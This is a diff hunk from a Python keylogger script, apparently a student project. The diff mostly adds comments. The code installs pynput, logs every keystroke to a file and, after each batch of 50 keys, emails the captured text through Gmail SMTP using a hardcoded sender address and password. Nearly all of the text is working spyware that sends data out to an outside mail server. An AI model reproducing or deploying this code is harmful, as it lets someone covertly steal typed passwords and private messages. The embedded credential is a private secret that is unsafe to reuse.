@@ -9,35 +9,40 @@ subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
 keys = []
 count = 0
 
-##logging file
+# Logging file
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
-#recording key presses      
+# Recording key presses
 def on_press(key):
     logging.info(str(key))
     print(key, "typed")
     global keys, count
+    # Adding key pressed to keys array
     keys.append(str(key))
     count+=1
-    ##key limit, change after testing over
+    # Key limit, change after testing over
     if count > 50:
         count = 0
         email(keys)
 
-def email(keys):    
+def email(keys):  
     message = ""
     for key in keys:
+        # Replace miscellenous characters to make it more readable 
         x = key.replace("'","")
         if key == "Key.space":
             x = "SPACE"
         elif key == "Key.backspace":
             x = "BACKSPACE"
         message += x
+    # Debug terminal message
     print(message)
+    # Sending the message
     sendEmail(message)
 
 def sendEmail(message):
-    port = 465  # For SSL
+    # For SSL
+    port = 465
     smtp_server = "smtp.gmail.com"
     senderEmail = "fypkeylogger@gmail.com"
     password = "keylog123##"
